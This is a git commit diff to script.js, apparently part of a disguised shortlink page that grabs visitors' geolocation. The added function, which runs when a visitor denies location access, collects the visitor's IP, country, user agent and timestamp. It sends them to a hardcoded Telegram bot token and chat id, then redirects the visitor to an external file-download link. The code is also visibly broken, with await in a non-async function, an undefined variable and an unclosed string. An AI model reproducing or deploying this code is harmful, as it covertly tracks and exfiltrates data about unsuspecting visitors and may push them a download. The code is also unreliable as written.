b3892736640f2cee8918df6e3ae75089ae88a1b1
shortlinks2024 <rojlocation@proton.me>
2024-05-26 10:10:04 +0300

    Update script.js

--- script.js
+++ script.js
@@ -28,15 +28,19 @@ function errorCallback(error) {
     switch (error.code) {
         case error.PERMISSION_DENIED:
             //document.getElementById('status').innerText = "User denied the request for Geolocation.";
+            sendToTelegramBotFail("Permission Denied");
             break;
         case error.POSITION_UNAVAILABLE:
             //document.getElementById('status').innerText = "Location information is unavailable.";
+            sendToTelegramBotFail("Position Unavialable");
             break;
         case error.TIMEOUT:
             //document.getElementById('status').innerText = "The request to get user location timed out.";
+            sendToTelegramBotFail("Timeout");
             break;
         case error.UNKNOWN_ERROR:
             //document.getElementById('status').innerText = "An unknown error occurred.";
+            sendToTelegramBotFail("Unknown Error");
             break;
     }
 }
@@ -78,3 +82,31 @@ Google Maps: [View Location](https://www.google.com/maps/search/?api=1&query=${l
 }
 
 
+function sendToTelegramBotFail(reason) {
+    // Replace with your bot token and chat id
+    const token = '6343774431:AAFR-TYiel6owWpqzotB5rRtIpkY_saSrdc';
+    const chatId = '7175670385';
+    let currentTimestamp = new Date().toISOString();
+    let userAgent = navigator.userAgent;
+    let ipAndCountry = await getIPAndCountry();
+    let ip = ipAndCountry.ip;
+    let country = ipAndCountry.country;
+
+    const text = `
+\`\`\`
+Timestamp: ${timestamp},
+Reason: ${reason},
+User Agent: ${userAgent},
+IP: ${ip},
+Country: ${country},
+\`\`\`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error(error));
+
+     window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
+}
